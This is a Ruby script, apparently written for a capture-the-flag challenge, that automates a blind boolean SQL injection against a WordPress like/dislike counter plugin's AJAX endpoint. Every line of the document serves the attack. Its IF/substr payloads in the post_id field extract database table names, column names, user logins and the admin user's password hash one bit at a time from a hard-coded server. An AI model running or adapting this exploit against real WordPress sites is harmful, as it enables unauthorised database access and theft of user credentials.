#substr(LPAD(bin(ascii(substr(target, #{i}, 1))),8,0), #{j}, 1) = 0x31

require 'rubygems'
require 'mechanize'

database = '0x7072656368616C6C'
table = "0x" + ("$P$BeWNozh1nxAkcILXemEorouBJ0OQbd1".each_byte.map{|x| "%02X" % x}).join
login = "0x" + ("admin".each_byte.map{|x| "%02X" % x}).join
browser = Mechanize.new
result = ""
offset = ARGV[0].to_i
100.times do |i|
puts "#{i}th char"
bin_text = ""
8.times do |j|
puts "#{j} position"
#post_id = "IF(substr(LPAD(bin(ascii(substr(database(), #{i + 1}, 1))), 8,0), #{j + 1}, 1) = 0x31, 18, 200)"
post_id = "IF(substr(LPAD(bin(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=#{database}), #{i + 1 + offset}, 1))), 8,0), #{j + 1}, 1) = 0x31, 18, 200)"
post_id = "IF(substr(LPAD(bin(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=#{table}), #{i + 1}, 1))), 8,0), #{j + 1}, 1) = 0x31, 18, 200)"
#post_id = "IF(substr(LPAD(bin(ascii(substr((select group_concat(user_login) from wp_users), #{i + 1}, 1))), 8,0), #{j + 1}, 1) = 0x31, 18, 200)"
post_id = "IF(substr(LPAD(bin(ascii(substr((select group_concat(user_pass) from wp_users where user_login=#{login}), #{i + 1+offset}, 1))), 8,0), #{j + 1}, 1) = 0x31, 18, 200)"
body = {"post_id"=> post_id, "up_type"=> "like"}
page = browser.post('http://14.0.84.130:8080/prechall/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php', body)
if page.body.to_i(10) > 1
bin_text += '1'
else
bin_text += '0'
end
p bin_text
end
result += bin_text.to_i(2).chr
puts "FOUND : #{result}"
end
